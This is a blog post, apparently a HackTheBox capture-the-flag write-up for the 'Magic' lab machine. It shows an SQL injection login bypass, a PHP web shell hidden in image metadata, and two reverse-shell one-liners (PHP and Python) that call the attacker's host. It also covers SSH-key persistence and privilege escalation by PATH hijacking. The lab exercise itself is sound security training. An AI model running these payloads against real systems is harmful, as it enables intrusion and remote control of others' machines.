<!doctype html>
<html lang="en-us">
  <head>
    <title>Magic - HackTheBox // R1x0n</title>
    <link rel="stylesheet" type="text/css" href="/static/css/style.css">
    <link rel="shortcut icon" href="/favicon.ico" />
      <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">


    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.80.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="http://127.0.0.1:1313/css/main.min.9c85f19995f193906921ead51ce6b5a58faf690a7b6863c50a4d0c487f7f94e5.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Magic - HackTheBox"/>
<meta name="twitter:description" content="Become User ‚Äî- Enumeration ‚Äî- The first thing that I do is scan for the opened ports:
nmap -sC -sV -oA nmap 10.10.10.185 This command returns me the following result:
# Nmap 7.80 scan initiated Sun May 31 22:17:52 2020 as: nmap -sV -sC -oA nmap 10.10.10.185 Nmap scan report for 10.10.10.185 Host is up (0.044s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7."/>

    <meta property="og:title" content="Magic - HackTheBox" />
<meta property="og:description" content="Become User ‚Äî- Enumeration ‚Äî- The first thing that I do is scan for the opened ports:
nmap -sC -sV -oA nmap 10.10.10.185 This command returns me the following result:
# Nmap 7.80 scan initiated Sun May 31 22:17:52 2020 as: nmap -sV -sC -oA nmap 10.10.10.185 Nmap scan report for 10.10.10.185 Host is up (0.044s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://127.0.0.1:1313/posts/magic/" />
<meta property="article:published_time" content="2020-06-05T00:00:00+00:00" />
<meta property="article:modified_time" content="2020-06-05T00:00:00+00:00" />


  </head>
  <body>

    <header class="app-header"id="particles-js">
      <a href="http://127.0.0.1:1313"><img class="app-header-avatar" src="/avatar.jpg" alt="John Doe" /></a>
      <h1>R1x0n</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/certifications/">Certifications</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
      </nav>
      
      <p>üë∂üèΩ : 1998, Lugano CH <br>üìç: Lugano CH</p>



      

      
        <script src='https://cldup.com/S6Ptkwu_qA.js'></script><script  src="static/utils/script.js"></script>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
	    <h1 class ="post-title">Magic - HackTheBox	
	      
	      <img src="/posts/magic/static/logo.png" class="logo">
      </h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Jun 5, 2020
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          4 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="http://127.0.0.1:1313/tags/hackthebox/">HackTheBox</a>
              <a class="tag" href="http://127.0.0.1:1313/tags/writeup/">Writeup</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <h2 id="become-user">Become User</h2>
<h3 id="--enumeration--">‚Äî- Enumeration ‚Äî-</h3>
<p>The first thing that I do is scan for the opened ports:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -oA nmap 10.10.10.185
</code></pre></div><p>This command returns me the following result:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.80 scan initiated Sun May 31 22:17:52 2020 as: nmap -sV -sC -oA nmap 10.10.10.185</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.185
Host is up <span style="color:#f92672">(</span>0.044s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style="color:#75715e"># Nmap done at Sun May 31 22:18:05 2020 -- 1 IP address (1 host up) scanned in 12.20 seconds</span>
</code></pre></div><p>It seems a very normal Linux machine, let‚Äôs go to see what can I find on port 80:
<img src="/posts/magic/static/index_site.png" width="50%" height="50%" align="center" class="center">
After a dirbuster scanning looking for .php extension I found the following pages:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/images <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/login.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/assets <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/upload.php <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
/logout.php <span style="color:#f92672">(</span>Status: 302<span style="color:#f92672">)</span>
/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
</code></pre></div><p>At this point, the only entry point seems to be the ‚Äúlogin.php‚Äù file.
Go to play a bit whit it!</p>
<h3 id="--sqli-bypass--">‚Äî- SQLi bypass ‚Äî-</h3>
<p>For the test to an SQLi point, I like to see the application‚Äôs behavior through Burp, I try to understand if it is vulnerable.
<img src="/posts/magic/static/login_burp.png" width="60%" height="60%" align="center" class="center">
After some tests I found the easiest way to abuse the SQLi, modifying the post‚Äôs arguments as follow:</p>
<pre><code>username=' -- -&amp;password=random
</code></pre><p>Nice, now I am in front of an Upload form!
<img src="/posts/magic/static/upload.png" width="35%" height="35%" align="center" class="center"></p>
<h3 id="--upload-with-magic--">‚Äî- Upload with magic ‚Äî-</h3>
<p>When I see an upload form I always rejoice, normally they give great emotions.</p>
<p>This specific upload form initially it seemed to me insuperable, every tries to upload a malformed file to get a ‚Äúweb shell‚Äù were blocked whit the following popup:
<img src="/posts/magic/static/upload_error.png" width="45%" height="45%" align="center" class="center"></p>
<p>The security logic behind the form always checked:</p>
<ul>
<li>The final extension (allowed: png, jpg, jpeg)</li>
<li>The integrity of the image</li>
</ul>
<p>With these two checks I had to find a way to bypass both, te following steps reproduces the trick:</p>
<ul>
<li>Take an intact picture</li>
<li>Rename it with the following command:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mv image.jpeg image.php.jpeg
</code></pre></div><ul>
<li>Add PHP code to his MetaData:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">exiftool -documentname<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;?php echo shell_exec($_GET[&#34;e&#34;].&#34; 2&gt;&amp;1&#34;); infophp();?&gt;&#39;</span> image.php.jpeg
</code></pre></div><ul>
<li>Upload the image to the website</li>
<li>Make the following GET request to the image to retrieve a revershell:</li>
</ul>
<pre><code>http://10.10.10.185/images/uploads/image.php.jpeg?e=php+-r+%27$sock%3dfsockopen(%22MY-IP%22,MY-PORT)%3bexec(%22/bin/sh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%2
</code></pre><img src="/posts/magic/static/first_shell.png" width="45%" height="45%" align="center" class="center">
<h3 id="--search-for-interesting-info--">‚Äî- Search for interesting info ‚Äî-</h3>
<p>On the machine, I‚Äôm able to see only another user, &ldquo;theseus&rdquo;.
After some minutes to look around in the machine&rsquo;s filesystem I found the credentials that the application uses to interact with the database.</p>
<pre><code>/var/www/Magic/db.php5
localhost:Magic:theseus:iamkingtheseus
</code></pre><p>Mysql client is not installed on the machine, so I used this PHP code to dump the entire database. (LINK)
What exactly I did:</p>
<ul>
<li>Write the linked code to the root web folder whit the credentials found</li>
<li>Visited the written page from my browser to trigger the code</li>
<li>Read the ‚Äúdump.sql‚Äù file written by my PHP code with all the information</li>
</ul>
<p>The very important information I found in this file was the credentials to log in to the Website‚Äôs uploads form:</p>
<pre><code>admin:Th3s3usW4sK1ng
</code></pre><p>For some reason, the password was the same for the user on the machine, so <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">whit some magic</a> I upgraded my rever shell and i wrote the following command to becom the &ldquo;theseus&rdquo; user:</p>
<pre><code>su theseus
</code></pre><p>and pass the found password!
The user&rsquo;s flag it&rsquo;s done!</p>
<h2 id="become-root">Become root</h2>
<h3 id="--find-a-way--">‚Äî- Find a way ‚Äî-</h3>
<p>To give me the persistence to the machine I added my public id_rsa key to the ssh authorized_keys of the user &ldquo;theseus&rdquo;.
In this way I can simply login to the machine through the following command:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh theseus@10.10.10.185
</code></pre></div><p>At this point, I spent some time around the machine to try to find a miss configuration or something that allow me to become root.
At the end of my research, I found an interesting non-standard SUID thanks to the following python script. (<a href="https://github.com/Anon-Exploiter/SUID3NUM/blob/master/suid3num.py">LINK</a>)</p>
<img src="/posts/magic/static/sui_enum.png" width="45%" height="45%" align="center" class="center">
<p>A non-standard SUID could be a possible attack vector, I need more information about /bin/sysinfo</p>
<p>A good way that I thought to see if and which executables are called by /bin/sysinfo it‚Äôs to use the &ldquo;strings&rdquo; command on it.</p>
<img src="/posts/magic/static/sysinfo.png" width="45%" height="45%" align="center" class="center">
In the red box, I can see three different commands that are executed by /bin/sysinfo. NICE, IT‚ÄôS TIME TO CREATE A FAKE EXECUTABLE!
<h3 id="--privilege-escalation-using-path-variable--">‚Äî- Privilege Escalation Using PATH Variable ‚Äî-</h3>
<p>All the technical details for this type of attack are linked <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">here</a>.</p>
<p>The following steps reproduce the trick:</p>
<ul>
<li>Write /tmp/lshw with the following payload:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;MY-IP&#34;,MY-PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</code></pre></div><ul>
<li>Run:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod <span style="color:#ae81ff">777</span> /tmp/lshw
$ export PATH<span style="color:#f92672">=</span>/tmp:$PATH
$ /bin/sysinfo
</code></pre></div><p>I have just to open a listening port before run /bin/sysinfo and a new root shell will spawn to me!</p>
<img src="/posts/magic/static/root.png" width="45%" height="45%" align="center" class="center">

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
